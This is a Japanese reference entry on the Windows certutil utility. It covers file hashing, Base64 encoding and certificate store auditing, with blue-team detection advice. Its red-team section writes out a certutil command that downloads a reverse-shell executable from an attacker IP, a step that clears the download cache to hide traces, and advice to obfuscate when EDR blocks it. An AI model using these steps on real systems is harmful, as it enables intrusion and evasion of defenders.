---
# --- YAML Frontmatter ---
created: '2026-02-22'
modified: '2026-02-22'
environment: [OS/Windows]
vulnearability: [File_Download, Obfuscation, Information_Disclosure]
knowledge_category: Command
tags:
  - 'certutil'
  - cmd
  - 'lolbas'
  - 'file_integrity'
  - 'cryptography'
  - 'knowledge_base'
---

# Command - Windows - cmd - certutil - 証明書サービスと各種ファイル操作

## 概要

`certutil` は、Windows の証明書サービス（Certificate Services）の一部としてインストールされるコマンドライン プログラムです。
証明書、CA (認証局) の構成情報の表示、証明書コンポーネントのバックアップと復元など、本来は公開鍵基盤 (PKI) の管理を目的としていますが、ハッシュ計算やファイル転送などの付加機能が強力なため、汎用的なユーティリティとして広く利用されています。
(出自: Windows標準搭載)



## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| `Get-FileHash` | PowerShell版。ファイルのハッシュ計算に特化し、オブジェクトとして扱える。 | `PowerShell` (整合性確認) |
| `bitsadmin` | ファイルダウンロード用。ジョブ管理が可能だが、`certutil` の方が構文が短い。 | `certutil` (迅速なDL) |
| `openssl` | サードパーティ製。より高度な暗号化・証明書操作が可能だが、標準では未搭載。 | `openssl` (複雑な暗号操作) |

## よく連携されるコマンド

### シナリオ例: ダウンロードしたツールの整合性確認 (インフラ構築)

* **目的**: 外部からダウンロードしたインストーラーが改ざんされていないか、SHA256ハッシュを確認する。
* **連携コマンド**: `findstr`
* **解説**: `hashfile` サブコマンドでハッシュを生成し、期待値と比較します。
* **コマンド例**:
    ```cmd
    REM インストーラーのSHA256ハッシュを表示
    certutil -hashfile setup.exe SHA256
    ```


## スイッチ/オプション説明

`certutil` はサブコマンド形式を採用しており、非常に多くの機能があります。

| サブコマンド | 説明 |
| :--- | :--- |
| **ファイル操作（重要）** | |
| ⭐ `-hashfile <File> [Algo]` | ファイルのハッシュ値を計算する。アルゴリズムには `MD5`, `SHA1`, `SHA256` 等が指定可能。 |
| ⭐ `-encode <In> <Out>` | ファイルを Base64 形式でエンコードする。 |
| ⭐ `-decode <In> <Out>` | Base64 エンコードされたファイルを元のバイナリに復元する。 |
| ⭐ `-urlcache -split -f <URL> <File>` | **重要。** 指定したURLからファイルをダウンロードし、保存する。 |
| **証明書管理** | |
| `-store` | 証明書ストアの内容を表示する。 |
| `-addstore <Store> <Cert>` | 指定したストアに証明書を追加する。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: スクリプト内でのバイナリデータの埋め込み
* **解説**: バッチファイル内に実行ファイルを持たせることができない制約下で、Base64化したテキストを `decode` して実行ファイルを生成します。
* **例**:
    ```cmd
    REM テキストファイル(encoded.txt)から実行ファイル(tool.exe)を復元
    certutil -decode encoded.txt tool.exe
    ```

### 2. ブルーチーム視点

* **タスク**: ルート証明書ストアの不正な追加の監視
* **解説**: 攻撃者が中間者攻撃 (MitM) のために自身の偽造証明書を「信頼されたルート証明書機関」に追加していないか監査します。
* **例**:
    ```cmd
    REM 信頼されたルートストアの証明書一覧を表示して不審なものがないか確認
    certutil -store Root
    ```

### 3. レッドチーム視点 (OSCP / File Transfer)

* **タスク**: 侵入した端末への追加ツールのダウンロード (Ingress Tool Transfer)
* **解説**: ターゲット端末で Web ブラウザが使えない、あるいは PowerShell が制限されている場合、`certutil` をダウンローダーとして悪用します。
* **例**:
    ```cmd
    REM 攻撃者のサーバーからリバースシェルをダウンロード
    certutil -urlcache -split -f [http://10.10.14.5/shell.exe](http://10.10.14.5/shell.exe) %TEMP%\shell.exe
    
    REM 痕跡を消すためにキャッシュをクリア
    certutil -urlcache -split -f [http://10.10.14.5/shell.exe](http://10.10.14.5/shell.exe) delete
    ```


## エラーメッセージとトラブルシューティング

### よくあるトラブル

1.  **現象**: `hashfile` 実行時に「ファイルのハッシュを計算できません」と出る。
    * **考えられる原因**: ファイルが他のプロセスによって排他的に開かれている、またはパスが間違っている。
    * **解決策**: `tasklist` 等でプロセスを確認するか、パスを `"` で囲んで再試行。

2.  **現象**: ダウンロードがブロックされる。
    * **原因**: Windows Defender や EDR が `certutil` によるインターネットアクセスを不審な挙動としてブロックしている。
    * **解決策**: (レッドチーム視点) 難読化や別のダウンロード手法を検討する。(ブルーチーム視点) 正当な理由がないアクセスであれば侵害とみなす。

## 環境変数と設定ファイル

`certutil` 固有の環境変数はありませんが、証明書ストアの場所（レジストリ）に強く依存します。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **悪用シナリオ**: 
    - **Downloader**: 標準コマンドであるため、外部からのマルウェアダウンロードに頻繁に悪用されます。
    - **Obfuscation**: `decode` 機能を使って、セキュリティ製品のスキャンを回避するために Base64 化された不正コードを復元する。

### LOLBAS (Living Off The Land Binaries and Scripts) における利用例

* **機能**: `Download`, `Encode`, `Decode`
* **解説**: Windows 標準搭載でありながらネットワーク通信とファイル変換が可能なため、LOLBAS の代表格として知られています。
* **参照**: [LOLBAS - certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: 
    - 不要なサーバーでの `certutil` による外部通信をファイアウォールで遮断する。
* **Detection (検知)**: 
    - **イベントID 4688**: `certutil` の実行を監視。特に `-urlcache` や `-decode` スイッチを含むコマンドライン引数はアラート対象とする。
    - **ネットワーク監視**: `certutil.exe` プロセスによる外部 HTTP/HTTPS 通信を検知。

## 注意点・補足

* **キャッシュ**: `-urlcache` でダウンロードしたファイルは一時フォルダにキャッシュが残ります。レッドチームとしては `delete` サブコマンドでこれを消去するのが定石です。
* **出力のパース**: `hashfile` の出力には余分なテキストが含まれるため、バッチファイルでハッシュ値だけを取り出すには `for /f` との組み合わせが必要です。

---